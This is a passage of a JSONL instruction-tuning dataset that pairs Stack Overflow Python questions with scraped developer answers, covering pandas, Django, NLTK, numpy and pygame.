href=\"https:\/\/github.com\/nltk\/nltk\/blob\/6404712d0a64c3d6e3700032c23a59803615460c\/nltk\/corpus\/reader\/wordnet.py#L1076\" rel=\"nofollow noreferrer\">source code<\/a> are these: <code>adj<\/code>, <code>adv<\/code>, <code>adv<\/code> and <code>verb<\/code>.<\/p>\n\n<p><strong>EDIT<\/strong> based on @bivouac0 's comment:<\/p>\n\n<p>So to bypass this issue you have to make a mapper. Mapping function is heavily based on this <a href=\"https:\/\/stackoverflow.com\/a\/15590384\/6779252\">answer<\/a>. Non-supported POS will not be lemmatized.<\/p>\n\n<pre class=\"lang-py prettyprint-override\"><code>import nltk\nimport pandas as pd\nfrom nltk.corpus import wordnet\nfrom nltk.stem import WordNetLemmatizer \n\nlemmatizer = WordNetLemmatizer()\n\ndef get_wordnet_pos(treebank_tag):\n    if treebank_tag.startswith('J'):\n        return wordnet.ADJ\n    elif treebank_tag.startswith('V'):\n        return wordnet.VERB\n    elif treebank_tag.startswith('N'):\n        return wordnet.NOUN\n    elif treebank_tag.startswith('R'):\n        return wordnet.ADV\n    else:\n        return None\n\nx = pd.DataFrame(data=[['this is a sample of text.'], ['one more text.']], \n                 columns=['Phrase'])\n\nx['Phrase'] = x['Phrase'].apply(lambda v: nltk.pos_tag(nltk.word_tokenize(v)))\n\n\nx['Phrase_lemma'] = x['Phrase'].transform(lambda value: ' '.join([lemmatizer.lemmatize(a[0],pos=get_wordnet_pos(a[1])) if get_wordnet_pos(a[1]) else a[0] for a in  value]))\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Save multiple values in one field (Django)<h1>The problem:<\/h1>\n<p>I have a model, which is referencing the basic User model of django. Right now, if I submit the form Django updates my database by replacing the existing data with the new one. I want to be able to access both of them. (In weight and date field)<\/p>\n<h1>Models file:<\/h1>\n<p>I saw other posts here, where they solved a problem by specifying a foreign key, but that doesn't solve it for me.<\/p>\n<pre><code>from django.db import models\nfrom django.contrib.auth.models import User\nfrom django.db.models.signals import post_save\nfrom django.dispatch import receiver\n# Create your models here.\nclass Profile(models.Model):\n      user = models.ForeignKey(User, on_delete=models.CASCADE)\n      weight = models.FloatField(max_length=20, blank=True, null=True)\n      height = models.FloatField(max_length=20, blank=True, null=True)\n      date = models.DateField(auto_now_add=True)\n      def __str__(self):\n          return self.user.username\n\n      @receiver(post_save, sender=User)\n      def save_user_profile(sender, instance, created, **kwargs):\n      if created:\n      Profile.objects.create(user=instance)\n<\/code><\/pre>\n<h1>Views file:<\/h1>\n<p>This is where I save the data that I get from my form called WeightForm<\/p>\n<pre><code>from django.shortcuts import render\nfrom django.contrib.auth.models import User\nfrom django.http import JsonResponse\nfrom django.shortcuts import get_object_or_404\nfrom users import models\nfrom users.models import Profile\nfrom .forms import WeightForm\n\ndef home(request):\n    form = WeightForm()\n    if request.is_ajax():\n       profile = get_object_or_404(Profile, id = request.user.id)\n       form = WeightForm(request.POST, instance=profile)\n       if form.is_valid():\n          form.save()\n          return JsonResponse({\n            'msg': 'Success'\n        })\n       \n    \nreturn render(request, 'Landing\/index.html',{'form':form})\n<\/code><\/pre>\n<h1>What I tried:<\/h1>\n<p>I used to have a OneToOneField relation with this model, but as you can see I changed it to foreignkey, according to answers I saw on this site.<\/p>\n<p>Thanks if you've gotten this far in my mess :D<\/p>","output_text":"<p>I didn't understood exactly what you mean by &quot;I want to be able to access both of them. (In weight and date field)&quot; but I guess you want user to be able to see their previous data of weight and Date also, so you can try doing this:<\/p>\n<p>In your models.py do try doing this,<\/p>\n<pre><code>class Profile(models.Model):\n      user_id = models.AutoField(primary_key=True)\n      user = models.ForeignKey(User, on_delete=models.CASCADE)\n      height = models.FloatField(max_length=20, blank=True, null=True)\n      def __str__(self):\n          return self.user.username\n\nclass UserData(models.Model):\n      Data_id = models.AutoField(primary_key=True)\n      user_id = models.ForeignKey(Profile, on_delete=models.CASCADE)\n      weight = models.FloatField(max_length=20, blank=True, null=True)\n      date = models.DateField(auto_now_add=True)\n<\/code><\/pre>\n<p>then u can have seperate forms for both the models and use them combined.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Groupby on a column to get its counts while retaining all other columns intact<p>Please take a look at the below input data frame.<\/p>\n<pre><code>df = pd.DataFrame({&quot;Name&quot;: ['A','A','B','B','C'], 'Tag':[1,2,3,4,5], 'Field':['X','X','Y','Z','R'] })\n\n  Name  Tag Field\n0    A    1     X\n1    A    2     X\n2    B    3     Y\n3    B    4     Z\n4    C    5     R\n<\/code><\/pre>\n<p>I am looking at the counts of &quot;Name&quot; column as an additional column named &quot;Count&quot; while retaining the &quot;Tag&quot; and &quot;Field&quot; column values in tact.<\/p>\n<p>Expected output:<\/p>\n<pre><code>  Name  Count  Tag Field\n0    A      2    1     X\n1    A      2    2     X\n2    B      2    3     Y\n3    B      2    4     Z\n4    C      1    5     R\n<\/code><\/pre>\n<p>My try:<\/p>\n<p>I could achieve this with a <code>groupby<\/code> and <code>merge<\/code> and its below. However, I am guessing that I am over complicating this and looking for better solutions than mine. Please help.<\/p>\n<pre><code>df1 = df.groupby(&quot;Name&quot;)['Tag'].count().reset_index()\ndf1 = df1.rename(columns={'Tag' : 'Count'})\ndf1 = df1.merge(df, on='Name', how='left')\n<\/code><\/pre>","output_text":"<p>IIUC you need <code>transform<\/code>:<\/p>\n<pre><code>df[&quot;count&quot;] = df.groupby(&quot;Name&quot;)[&quot;Tag&quot;].transform(&quot;size&quot;)\n\nprint (df)\n\n  Name  Tag Field  count\n0    A    1     X      2\n1    A    2     X      2\n2    B    3     Y      2\n3    B    4     Z      2\n4    C    5     R      1\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to calculate the number of matching string with external dictionary in Python<p>I've created a dictionary using other source and I'm trying to count the number of matching word and the non-matching word of a sentence.<\/p>\n<pre><code>dictionary = [&quot;hello&quot;, &quot;good&quot;, &quot;happy&quot;]\nstr1 = [&quot;the dog is happy&quot;]\n<\/code><\/pre>\n<p>For example above, I want to find out the number of word in str1 that is matching with the dictionary and the number of non-matching, the result would be something like number of matching = 1 and number of non-matching = 3. Is this possible?<\/p>","output_text":"<pre><code>d = [&quot;hello&quot;, &quot;good&quot;, &quot;happy&quot;]\ns = &quot;the dog is happy&quot;\n<\/code><\/pre>\n<p>note: i turned <code>[&quot;the dog is happy&quot;]<\/code> --&gt; <code>&quot;the dog is happy&quot;<\/code> as the list is unnecessary<\/p>\n<pre><code>l = [i in d for i in s.split(' ')]\nmatching = l.count(True)  # can also use sum(l)\nnon_matching = l.count(False)\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Looking for Simple Python Formula to Combine Two Text Files<p>Beginner Python user here. I'm trying to write a formula that will merge two text files. As in, the first file should have the text of the second simply <em>added<\/em> to it, not replacing anything in either file. <\/p>\n\n<p>Here's what I have so far:<\/p>\n\n<pre><code>def merge(file1,file2):\n    infile = open(file2,'r')\n    infile.readline()\n    with open('file1','a') as myfile:\n        myfile.write('infile')\n        myfile.close()\n<\/code><\/pre>\n\n<p>Any help would be greatly appreciated. <\/p>","output_text":"<p>You seem to have the right idea, a way it could be simplified and easier to read would be the following code I found on google, fit to your method.<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>def merge(file1,file2):\n    fin = open(file2, &quot;r&quot;)\n    data2 = fin.read()\n    fin.close()\n    fout = open(file1, &quot;a&quot;)\n    fout.write(data2)\n    fout.close()\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n to divide the rows with null values in a dataframe in another dataframe<p>I want to convert the dataframe having null values into my test set so i can train the data with no null values and predict the null values using a regression model.<\/p>\n\n<pre><code>for i in df1:\n    if (df1['dependents'].iloc[i].notnull())==False:\n        test[i]=df1[i]\n<\/code><\/pre>\n\n<p>so far i tried this code but this showing an error.<\/p>\n\n<pre><code>TypeError                                 Traceback (most recent call last)\n&lt;ipython-input-13-975c8029ee0e&gt; in &lt;module&gt;\n      1 for i in df1:\n----&gt; 2     if (df1['dependents'].iloc[i].notnull())==False:\n      3         test[i]=df1[i]\n\n~\\anaconda3\\lib\\site-packages\\pandas\\core\\indexing.py in __getitem__(self, key)\n   1765 \n   1766             maybe_callable = com.apply_if_callable(key, self.obj)\n-&gt; 1767             return self._getitem_axis(maybe_callable, axis=axis)\n   1768 \n   1769     def _is_scalar_access(self, key: Tuple):\n\n~\\anaconda3\\lib\\site-packages\\pandas\\core\\indexing.py in _getitem_axis(self, key, axis)\n   2132             key = item_from_zerodim(key)\n   2133             if not is_integer(key):\n-&gt; 2134                 raise TypeError(\"Cannot index by location index with a non-integer key\")\n   2135 \n   2136             # validate the location\n\nTypeError: Cannot index by location index with a non-integer key\n<\/code><\/pre>","output_text":"<p><code>for i in df1<\/code> will iterate over the column names rather than the rows. To iterate over the rows, you need to use <code>iterrows()<\/code> or <code>iteritems()<\/code>, as explained in <a href=\"https:\/\/stackoverflow.com\/questions\/16476924\/how-to-iterate-over-rows-in-a-dataframe-in-pandas\">this answer<\/a>:<\/p>\n\n<pre><code>import pandas as pd\nfrom numpy import nan\n\n# example data\ndf1 = pd.DataFrame(\n    {'age':        [ 30,  16,  40,  40,  30],\n     'gender':     ['M', 'F', 'X', 'M', 'F'],\n     'dependents': [  2,   0,   2, nan,   3]})\n\n# will hold the non-null rows\ntrain = []\n# will hold the null rows\ntest = []\n\n# use iterrows to loop over rows in the dataframe\nfor i, row in df1.iterrows():\n    if pd.isnull(df1['dependents'].iloc[i]):\n        test.append(row)\n    else:\n        train.append(row)\n\n# build dataframe from rows\ntrain_df = pd.DataFrame(train)\ntest_df  = pd.DataFrame(test)\n<\/code><\/pre>\n\n<p>However, it's usually not necessary to iterate over rows like this at all. There's a much more efficient way:<\/p>\n\n<pre><code>train_df = df1[~pd.isnull(df1['dependents'])]\ntest_df  = df1[pd.isnull(df1['dependents'])]\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n nD \"cube\" from ranges<p>I have a mixed integer problem. I need to minimize a function, which is a weighted least square regression, the weights being dependent on the regression (iteratively reweighted least square). 7 parameters define my piecewise regression. I need to find a local minima around a first guess.<\/p>\n<p>I tried to write the problem in gekko, but I somehow find it very difficult to implement. After many tries, I stopped at &quot;negative DOF&quot;.<\/p>\n<p>Anyway, I decided to brute force the problem. It works, but it's slow. I build a cube (itertools) around my working point in 7D and calculate the weighted square errors at each of the 3^7 points. I have boundaries for each dimension, and sometimes my working point is on one of the faces of my 7D domain. Technically, I have 2^p * 3^(7-p) points. I now have a list of all the values, find the minimum, move my working point there and restart building a cube, excluding all the points that I have already calculated in the previous loop steps.<\/p>\n<p>Now I want to accelerate it by calculating the gradient at my working point and move faster (skip a step or two in my loop). np.gradient will require a 7d array in order to perform correctly.<\/p>\n<p>Given a point, and 7 ranges around that point, how to make a 7D array in an efficient way? How to make an image of this array with the values of my function?<\/p>\n<p>Please don't say 7 for loops.<\/p>","output_text":"<p>Regardless of whether your function is vectorized, you can use an approach with <a href=\"https:\/\/numpy.org\/doc\/stable\/reference\/generated\/numpy.indices.html\" rel=\"nofollow noreferrer\"><code>np.indices<\/code><\/a> like this:<\/p>\n<pre><code>base_grid = np.indices(7 * (3,), sparse=False) - 1\n<\/code><\/pre>\n<p>This produces an array of all the combinations of <code>-1, 0, 1<\/code> that you need. <a href=\"https:\/\/numpy.org\/doc\/stable\/reference\/generated\/numpy.meshgrid.html\" rel=\"nofollow noreferrer\"><code>np.meshgrid<\/code><\/a> does something similar, but the arrays will be separated into a tuple, which is inconvenient.<\/p>\n<p>At each iteration, you modify the grid with your step (scale) and offset:<\/p>\n<pre><code>current_grid = base_grid * scale + offset\n<\/code><\/pre>\n<p>If your function is vectorized, you call it directly, the grid is 7 3x3x3x3x3x3x3 arrays. If it accepts seven inputs, just use star expansion.<\/p>\n<p>If your function is not vectorized, you can still step along the corresponding elements in a single loop, not seven loops, using <a href=\"https:\/\/numpy.org\/doc\/stable\/reference\/generated\/numpy.nditer.html\" rel=\"nofollow noreferrer\"><code>np.nditer<\/code><\/a>:<\/p>\n<pre><code>with np.nditer([current_grid, None],\n        op_axes=[list(range(1, current_grid.ndim)), None]) as it:\n    for x, y in it:\n        y[:] = f(*x)\n    j = it.operands[1]\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Simple Clean Math Operations<p>I'm trying to make some basic methods for handling python math operations, I made a method for getting the sum of all numbers in the args like these:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>def get_sum_of_numbers(*args):\n    temp_value = 0\n    for num in args:\n        temp_value += num\n    return temp_value\n<\/code><\/pre>\n<p>The problem is that when I try to create a simple average method:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>def get_average_of_numbers(*args):\n    return get_sum_of_numbers(args) \/ len(args)\n<\/code><\/pre>\n<p>I can't reuse this method because I can't just pass to the sum method the args of the average method as an argument, I want to make both the average method and the sum method take as many numbers as the programmer wishes to input. Anyone have any ideas?<\/p>","output_text":"<p>put <code>*<\/code> before [args]<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>def get_average_of_numbers(*args):\n    return get_sum_of_numbers(*args) \/ len(args)\n<\/code><\/pre>\n<p>and, yes, Tobi208 is right, You have incorrect indentation, see his answer, I don't want to steal his :)<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Reshape distance matrix in pandas<p>I have a dataframe in the shape of df1<\/p>\n\n<pre><code>import pandas as pd\n\ndf1 = pd.DataFrame({\n    'From': ['A','B','C'],\n    'To': ['X','Y','Z'],\n    'Price': [1,2,3] \n})\n<\/code><\/pre>\n\n<p>What I am trying to do is reshape df1 to have the form of df2. The desired end result would be this:<\/p>\n\n<pre><code>df2 = pd.DataFrame({\n    'Location': ['A','X','B','Y','C','Z'],\n    'Direction': ['Origin','Destination','Origin','Destination','Origin','Destination'],\n    'Price': [1,1,2,2,3,3] \n})\n<\/code><\/pre>\n\n<p>I would like to achieve that with pandas stack(), pivot(), melt(), etc., but I cannot figure out how it's done.<\/p>","output_text":"<p>First <code>rename<\/code> columns, then reshape by <a href=\"http:\/\/pandas.pydata.org\/pandas-docs\/stable\/reference\/api\/pandas.DataFrame.set_index.html\" rel=\"nofollow noreferrer\"><code>DataFrame.set_index<\/code><\/a> and <a href=\"http:\/\/pandas.pydata.org\/pandas-docs\/stable\/reference\/api\/pandas.DataFrame.stack.html\" rel=\"nofollow noreferrer\"><code>DataFrame.stack<\/code><\/a>:<\/p>\n\n<pre><code>df = (df1.rename(columns={'From':'Origin','To':'Destination'})\n         .set_index('Price')\n         .rename_axis('Direction', axis=1)\n         .stack()\n         .reset_index(name='Location')\n         .reindex(['Location','Direction','Price'], axis=1))\nprint (df)\n  Location    Direction  Price\n0        A       Origin      1\n1        X  Destination      1\n2        B       Origin      2\n3        Y  Destination      2\n4        C       Origin      3\n5        Z  Destination      3\n<\/code><\/pre>\n\n<p>If order is not important:<\/p>\n\n<pre><code>df2 = (df1.rename(columns={'From':'Origin','To':'Destination'})\n          .melt('Price',var_name='Direction',value_name='Location')\n          .reindex(['Location','Direction','Price'], axis=1)\n         )\nprint (df2)\n  Location    Direction  Price\n0        A       Origin      1\n1        B       Origin      2\n2        C       Origin      3\n3        X  Destination      1\n4        Y  Destination      2\n5        Z  Destination      3\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Password reset django-allauth and django-rest-auth<p>I cannot wrap my head around this problem. Read a lot of solutions but cannot seem to find the correct combination that works for me.<\/p>\n<p>I want to initiate a users password reset flow from within my (android\/iOS) app.\nI think I need <code>django-rest-auth<\/code> for this to expose an API endpoint something like this:<\/p>\n<pre><code>from rest_auth.views import PasswordResetView\n\nurlpatterns = [\n    path('password\/reset\/', PasswordResetView.as_view(), name='rest_password_reset'),\n]\n<\/code><\/pre>\n<p>Now posting to <code>http:\/\/127.0.0.1:8000\/password\/reset\/<\/code> with a JSON payload of <code>{ &quot;email&quot;: &quot;test1@test.com&quot; }<\/code> gives an error: <code>django.urls.exceptions.NoReverseMatch: Reverse for 'password_reset_confirm' not found.<\/code><\/p>\n<p>Now, I'm strugeling with the next part. I found that password_reset_confirm is defined in <code>django.contrib.auth<\/code> but I do not want to expose the <code>admin-like<\/code> interface to the user.<\/p>\n<p>I'd like to use the <code>allauth PasswordResetFromKeyView<\/code>.<\/p>\n<p>So, defining <code>password_reset_confirm<\/code> as:<\/p>\n<pre><code>    path('password\/reset\/&lt;uidb64&gt;\/&lt;token&gt;\/',\n         PasswordResetFromKeyView.as_view(),\n         name='password_reset_confirm'\n         ),\n<\/code><\/pre>\n<p>Works. An email is send containing a reset URL. But now, following that URL I'm getting another error: <code>PasswordResetFromKeyView.dispatch() missing 2 required positional arguments: 'uidb36' and 'key'<\/code><\/p>\n<p>Ok, obvious, changed the <code>password_reset_confirm<\/code> path arguments from <code>&lt;uidb64&gt;<\/code> and <code>&lt;token&gt;<\/code> to <code>&lt;uidb36&gt;<\/code> and <code>&lt;key&gt;<\/code>.\nThan the error moves to <code>password_reset_email.html<\/code> because of the arguments in\n<code>{{ protocol }}:\/\/{{ domain }}{% url 'password_reset_confirm' uidb64=uid token=token %} <\/code>\nOk, also changed that to <code>uidb32=uid<\/code> <code>and key=token<\/code> results in a HTML page displaying &quot;BAD TOKEN&quot;.<\/p>\n<p>Now, I'm completely at a loss.\nHow to configure django-allauth and django-rest-auth so that I can do a rest request to send the email containing a valid URL which the user can use to change his\/her password?<\/p>","output_text":"<p><strong>UPDATE:<\/strong> I just saw django-allauth is no longer maintained and that you should switch to: dj-rest-auth. Now the process starts all over again...<\/p>\n<p>Ok, the following works, posting for reference because I have lost an awful lot of time on this.<\/p>\n<p>Pipfile:<\/p>\n<pre><code>[packages]\ndjango = &quot;~=3.0&quot;\ndjango-allauth = &quot;0.50.0&quot;\ndjango-rest-auth = &quot;0.9.5&quot;\n<\/code><\/pre>\n<p>urls.py:<\/p>\n<pre><code>from django.contrib import admin\nfrom django.urls import path, re_path\n\n# Register\nfrom allauth.account.views import ConfirmEmailView\nfrom rest_auth.registration.views import RegisterView, VerifyEmailView\n\n# Password reset\nfrom rest_auth.views import PasswordResetView, PasswordResetConfirmView\n\nurlpatterns = [\n    path('admin\/', admin.site.urls),\n\n    re_path(r'^confirm-email\/(?P&lt;key&gt;[-:\\w]+)\/$',\n            ConfirmEmailView.as_view(), name='account_confirm_email'),\n\n    path('user\/register\/',\n         RegisterView.as_view(),\n         name='rest_register'\n         ),\n    path('user\/verify-email\/',\n         VerifyEmailView.as_view(),\n         name='rest_verify_email'\n         ),\n\n    # Password reset\n    path('user\/password\/reset\/',\n         PasswordResetView.as_view(),\n         name='rest_password_reset'\n         ),\n\n    path('user\/password\/reset\/confirm\/&lt;uidb64&gt;\/&lt;token&gt;\/',\n         PasswordResetConfirmView.as_view(),\n         name='password_reset_confirm'),\n]\n<\/code><\/pre>\n<p>I'm able to post to: <code>http:\/\/127.0.0.1:8000\/user\/password\/reset\/<\/code> with a JSON payload of <code>{ &quot;email&quot;: &quot;test1@test.com&quot; }<\/code>.<\/p>\n<p>A Email is generated with an reset URL, clicking this URL brings the user to the browsable API page of Django:<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/bDFTJ.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/bDFTJ.png\" alt=\"rest_reset_password\" \/><\/a><\/p>\n<p>However, this page is not intended to be exposed to the user. So my next question on S.O. is: <a href=\"https:\/\/stackoverflow.com\/questions\/71815707\/customize-django-allauth-django-rest-auth-password-reset-confirm\">How to create a custom page for the user to reset his\/her password?<\/a><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n I am trying to make a platform around the bottom of the screen but it keeps giving me an error<p>I have a problem when I made my code and This is the error it shows     <\/p>\n\n<blockquote>\n<pre><code>platforms_list.append[pl,Platform([200,20], 100, 450, White), Platform([200,20], 400, 250, White)]\nTypeError: 'builtin_function_or_method' object is not subscriptable\n<\/code><\/pre>\n<\/blockquote>\n\n<p>I don't get what it means by subscriptable. I have a circle player that can jump move and can go around but falls off his platform because there is no bottom platform and I don't no how to make it<\/p>\n\n<pre><code>import math\nimport os\nimport sys\n# It is importing everything\nimport pygame\nfrom pygame.locals import *\n\nclass Platform:\n    def __init__(self, size, x, y, color):\n        #size is a list, this means it has width and height\n        self.size = size\n        self.x = x\n        self.y = y\n        self.color = color\n\n    # This is what the platform class has and what it does\n    def draw(self):\n        display = pygame.display.get_surface()\n        pygame.draw.rect(display, self.color, (int(self.x), int(self.y), self.size[0], self.size[1]))\n\n    # This is def draw function is showing that how I want my Platform to look like\n    def do(self):\n        self.draw()\n\n\n# The def do function is running def draw function\n\nclass Player:\n    def __init__(self, velocity, maxJumpRange, x, y, size):\n        self.falling = True\n        self.jumpCounter = 0\n        self.xVelocity = 0\n        self.y = y\n        self.x = x\n        self.jumping = False\n        self.velocity = velocity\n        self.maxJumpRange = maxJumpRange\n        self.jump_offset = 0\n        self.size = size\n        self.TouchedGround = False\n\n    # The player class is making how the Player is going to look and what are his limits\n\n    def keys(self):\n        k = pygame.key.get_pressed()\n        # The def keys(self): is creating a variable for pygame.key.get_pressed() and underneath is a function to make the player move around\n        if k[K_LEFT]:\n            self.xVelocity = -self.velocity\n        elif k[K_RIGHT]:\n            self.xVelocity = self.velocity\n        else:\n            self.xVelocity = 0\n\n        if (k[K_SPACE] or k[K_UP]) and not self.jumping and self.TouchedGround:\n            self.jumping = True\n            self.jumpCounter = 0\n            self.TouchedGround = False\n\n\n    # The if k[K_Space] or k[K_UP] is making sure the player has a jump limit and can't continue jumping forever.\n    def move(self):\n        self.x += self.xVelocity\n        # if the player is jumping, change y value\n        if self.jumping:\n            self.y -= self.velocity\n            self.jumpCounter += 1\n            if self.jumpCounter == self.maxJumpRange:\n                self.jumping = False\n                self.falling = True\n        elif self.falling:\n            self.y += self.velocity\n            self.jumpCounter -= 1\n\n\n    def draw(self):\n        display = pygame.display.get_surface()\n        pygame.draw.circle(display, White, (int(self.x), int(self.y)), self.size)\n\n    def do(self):\n        self.keys()\n        self.move()\n        self.draw()\n\n\n# This Function is doing all of the Functions self.keys(), self.move(), self.draw()\n\ndef events():\n    for event in pygame.event.get():\n        if event.type == QUIT or (event.type == KEYDOWN and event.key == K_ESCAPE):\n            pygame.quit()\n            sys.exit()\n\n\n\n#window size\n\nw = 576\nh = 516\n\n# The above is showing the width the height and Area\nos.environ['SDL_VIDEO_WINDOW_POS'] = \"50,50\"\n# the above is showing what the graphics are\n\n#player\np = Player(1, 100, 290, 250, 30)\n\n\n#start pygame\npygame.init()\nClock = pygame.time.Clock()\nDS = pygame.display.set_mode((w, h))  # This is what the display size is\npygame.display.set_caption(\"Try to get point B\")\n\n\n\n#variables\nFPS = 120\nBlack = (0, 0, 0, 255)\nWhite = (255, 255, 255, 255)\nRed = (255, 0, 0)\n\n\n# Bkgd stands for background\nbkgd = pygame.Surface((w,h))  # didnt have the image so i made it blue\nbkgd.fill((0,0,255))\n\n\n\n#platforms\npl = Platform([290,20], 250, 350, White)\n#this is a list that holds all the platforms\nplatforms_list = [pl,Platform([200,20], 100, 450, White), Platform([200,20], 400, 250, White)]\nplatforms_list.append[pl,Platform([200,20], 100, 450, White), Platform([200,20], 400, 250, White)]\n#this is how much to scroll the background by\nbackground_scroll = 0\n\n\n# What the while true loop is doing is to make sure that the background moves while the player moves\nwhile True:\n    events()\n\n    #blit the background, since the image is same size as window blit twice so when scrolls, you dont have blackness\n    DS.blit(bkgd, (-background_scroll, 0))\n    DS.blit(bkgd, (w-background_scroll, 0))\n\n    #check for x button clicked\n    events()\n\n    #update the player\n    p.do()\n\n    #update platforms and check for collision with player\n    platform_color = Red\n    for platform in platforms_list:\n        platform.color = platform_color\n        if p.jumping == 0:\n            platform.color = White\n        platform.do()\n        #if bottom of player is in the platform, move the player on top of the platform\n        if p.y + p.size &gt; platform.y and p.y + p.size &lt; platform.y + platform.size[1]:\n            if p.x &gt; platform.x and p.x &lt; platform.x + platform.size[0]:\n                p.y = platform.y - p.size\n                p.TouchedGround = True\n\n    #if the player reaches the side of the screen, move the background and platforms to make it look like it is moving\n    if p.x + p.size &gt;= w:\n        p.x = w - p.size\n        background_scroll += 1\n        for platform in platforms_list:\n            platform.x -= 1\n        if background_scroll == w:\n            background_scroll = 0\n    #same but for the left\n    if p.x - p.size &lt;= 0:\n        p.x = 0 + p.size\n        background_scroll -= 1\n        for platform in platforms_list:\n            platform.x += 1\n        if background_scroll == 0:\n            background_scroll = w\n\n    #update screen\n    pygame.display.update()\n    Clock.tick(FPS)\n    DS.fill(Black)\n<\/code><\/pre>\n\n<p><code>platforms_list.append[pl,Platform([200,20], 100, 450, White), Platform([200,20], 400, 250, White)]<\/code> this is the code that I added but it keeps giving me the code<\/p>","output_text":"<p>I think append needs to be <code>.append()<\/code> not <code>[]<\/code>.<\/p>\n<p>Try this:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>platforms_list.append(pl,Platform([200,20], 100, 450, White), Platform([200,20], 400, 250, White))\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Dict comprehension with additional key<p>I have a dict comprehension that looks like this:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>bar = {\n    n: n**2\n    for n in range(1, 10)\n}\n<\/code><\/pre>\n<p>Is there any way to add an additional key to the dict in the same expression? I was thinking of something like this:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>bar = {\n    'foo': 'bar',\n    n: n**2\n    for n in range(1, 10)\n}\n<\/code><\/pre>\n<p>This doesn't work though. How can I achieve this?\nFor now I am adding the additional entry manually afterwards but it would be good if I could do it in the same expression.<\/p>\n<p>I know that the use case is not very clear from my example but in my actual code it would make things a lot easier.<\/p>","output_text":"<p>In python 3.9.0+, the <code>|<\/code> operator merges two dictionaries<\/p>\n<pre><code>bar = { 'foo': 'bar' } | {\n    n: n**2\n    for n in range(1, 10)\n}\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Use pandas to determine number of times a column has lowest value for a particular group<pre><code>       Experiment  Source    RMSE\n0    Experiment 10   sat8   931.453756\n1    Experiment 10   sat8   861.855506\n2    Experiment 10   sat8   859.305796\n3    Experiment 10   sat8   655.863104\n4    Experiment 10   sat8   935.915268\n..            ...         ...          ...\n571  Experiment 27  nel1   807.975352\n572  Experiment 27  nel1  1146.975889\n573  Experiment 27  nel1  1005.450225\n574  Experiment 27  nel1   967.833854\n575  Experiment 27  nel1   793.703938\n<\/code><\/pre>\n\n<p>I want to process the dataframe above to find the number of times a <code>Source<\/code> has the least <code>RMSE<\/code> value for a given <code>Experiment<\/code>. Result should look something like this:\nFor any given <code>Experiment<\/code>, only one of the <code>Source<\/code> can have the least RMSE so any given column sums up to 1.<\/p>\n\n<pre><code>sat8    0                        0 \nnel1    1                        1\n    Experiment 10 ....      Experiment 27\n<\/code><\/pre>\n\n<p>I tried using pivot table but not sure how to determine the <code>Source<\/code> with least <code>RMSE<\/code> for a given <code>Experiment<\/code><\/p>","output_text":"<p>Use <a href=\"http:\/\/pandas.pydata.org\/pandas-docs\/stable\/reference\/api\/pandas.get_dummies.html\" rel=\"nofollow noreferrer\"><code>get_dummies<\/code><\/a> with <a href=\"http:\/\/pandas.pydata.org\/pandas-docs\/stable\/reference\/api\/pandas.core.groupby.DataFrameGroupBy.idxmin.html\" rel=\"nofollow noreferrer\"><code>DataFrameGroupBy.idxmin<\/code><\/a> for minimal index (<code>Source<\/code>)  per groups by <code>RMSE<\/code> column:<\/p>\n\n<pre><code>df2 = (pd.get_dummies(df.set_index('Source')\n                        .groupby('Experiment')['RMSE']\n                        .idxmin()\n         ).T\n\n         )\nprint (df2)\nExperiment  Experiment 10  Experiment 27\nnel1                    0              1\nsat8                    1              0\n<\/code><\/pre>\n\n<p><strong>Detail<\/strong>:<\/p>\n\n<pre><code>print (df.set_index('Source').groupby('Experiment')['RMSE'].idxmin())\nExperiment\nExperiment 10    sat8\nExperiment 27    nel1\nName: RMSE, dtype: object\n<\/code><\/pre>"}
